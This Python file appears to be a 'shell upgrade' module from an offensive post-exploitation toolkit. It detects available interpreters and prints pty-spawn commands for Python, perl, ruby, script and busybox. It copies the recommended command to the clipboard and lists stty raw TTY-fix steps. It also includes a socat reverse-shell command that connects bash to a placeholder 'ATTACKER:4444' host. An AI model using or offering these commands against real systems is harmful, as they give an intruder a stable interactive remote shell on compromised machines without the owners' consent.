from shutil import which
import subprocess

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
BOLD = '\033[1m'

# =========================================================
# HELPERS
# =========================================================

def copy_clipboard(text):
    for utility in (
        ["xclip", "-selection", "clipboard"],
        ["xsel", "-bi"],
    ):
        try:
            p = subprocess.Popen(
                utility,
                stdin=subprocess.PIPE,
                close_fds=True,
            )
            p.communicate(text.encode())
            return True
        except FileNotFoundError:
            pass

    try:
        p = subprocess.Popen(
            ["pbcopy"],
            stdin=subprocess.PIPE,
            close_fds=True,
        )
        p.communicate(text.encode())
        return True
    except Exception:
        return False

# =========================================================
# MAIN
# =========================================================

def run(data, cred, args):

    upgrades = []

    if which("python3"):
        upgrades.append((
            "Python3 PTY",
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
        ))

    if which("python"):
        upgrades.append((
            "Python PTY",
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
        ))

    if which("script"):
        upgrades.append((
            "Script PTY",
            "script /dev/null -qc /bin/bash"
        ))

    if which("perl"):
        upgrades.append((
            "Perl",
            "perl -e 'exec \"/bin/bash\";'"
        ))

    if which("ruby"):
        upgrades.append((
            "Ruby",
            "ruby -e 'exec \"/bin/bash\"'"
        ))

    if which("busybox"):
        upgrades.append((
            "Busybox",
            "busybox sh"
        ))

    if which("socat"):
        upgrades.append((
            "Socat",
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444"
        ))

    print(
        f"\n{B}┌── {BOLD}MODULE: SHELL UPGRADE{W}{B} "
        f"────────────────────────────────────┐{W}"
    )

    if upgrades:

        detected = ", ".join(
            name.split()[0].lower()
            for name, _ in upgrades
        )

        print(
            f"{B}│{W}  {B}Detected:{W} "
            f"{C}{detected}{W}"
        )

    else:

        print(
            f"{B}│{W}  {R}No upgrade helpers detected{W}"
        )

    print(
        f"{B}└────────────────────────────────────────────────────────────┘{W}"
    )

    # =====================================================
    # RECOMMENDED
    # =====================================================

    if upgrades:

        print(
            f"\n{G}[RECOMMENDED]{W}\n"
        )

        print(
            f"{Y}{upgrades[0][1]}{W}\n"
        )

        if copy_clipboard(upgrades[0][1]):

            print(
                f"{G}[+] Recommended command copied "
                f"to clipboard{W}\n"
            )

    # =====================================================
    # ALTERNATIVES
    # =====================================================

    print(
        f"{C}[ALTERNATIVES]{W}\n"
    )

    for name, cmd in upgrades:

        print(
            f"{B}{name}:{W}"
        )

        print(
            f"  {Y}{cmd}{W}\n"
        )

    # =====================================================
    # TTY FIX
    # =====================================================

    print(
        f"{G}[TTY FIX]{W}\n"
    )

    tty_steps = [
        "CTRL+Z",
        "stty raw -echo",
        "fg",
        "reset",
        "export TERM=xterm",
        "stty rows 40 cols 120",
    ]

    for step in tty_steps:
        print(f"  {Y}{step}{W}")

    print()

    return data
